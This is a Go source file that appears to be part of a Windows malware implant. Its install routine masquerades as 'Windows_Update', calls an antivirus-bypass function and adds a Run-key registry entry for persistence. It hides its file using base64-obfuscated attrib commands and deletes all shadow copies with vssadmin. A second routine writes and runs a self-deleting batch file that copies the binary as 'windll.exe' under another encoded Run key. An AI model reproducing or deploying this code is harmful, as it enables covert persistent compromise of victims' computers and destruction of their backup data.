package main

import (
	"encoding/base64"
	"os"
)

func Install() {
	parent := GetParentFolder()
	if parent != "Windows_Update" && GetExeName() != TARGET_FILE_NAME { //If installed alredy don't install
		Run("mkdir %APPDATA%\\Windows_Update")
		CleanUpgrade()
	}
	BypassAV()
	//REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /V Windows_Update /t REG_SZ /F /D %APPDATA%\\Windows_Update\\
	Run("REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /V Windows_Update /t REG_SZ /F /D %APPDATA%\\Windows_Update\\" + TARGET_FILE_NAME)
	//attrib +H +S %APPDATA%\\Windows_Update\\
	Run(Base64Decode("YXR0cmliICtIICtTICVBUFBEQVRBJVxcV2luZG93c19VcGRhdGVcXA==") + TARGET_FILE_NAME)

	// TODO: Run with admin
	Run("vssadmin.exe Delete Shadows /All /Quiet") //admin
}

func Uninstall() {
	Run("REG DELETE HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /V Windows_Update /t REG_SZ /F /D %APPDATA%\\Windows_Update\\" + TARGET_FILE_NAME)
	Run("taskkill /IM " + TARGET_FILE_NAME + " /T /f & del %APPDATA%\\Windows_Update /Q /F")
}

func PersistenceBat() {
	//REG ADD HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /V WinDll /t REG_SZ /F /D %APPDATA%\Windows\windll.exe
	var RegAdd string = "UkVHIEFERCBIS0NVXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1biAvViBXaW5EbGwgL3QgUkVHX1NaIC9GIC9EICVBUFBEQVRBJVxXaW5kb3dzXHdpbmRsbC5leGU="
	DecodedRegAdd, _ := base64.StdEncoding.DecodeString(RegAdd)

	PERSIST, _ := os.Create("PERSIST.bat")

	PERSIST.WriteString("mkdir %APPDATA%\\Windows" + "\n")
	PERSIST.WriteString("copy " + os.Args[0] + " %APPDATA%\\Windows\\windll.exe\n")
	PERSIST.WriteString(string(DecodedRegAdd))

	PERSIST.Close()
	Run("cmd /C PERSIST.bat")
	Run("cmd /C del PERSIST.bat")
}
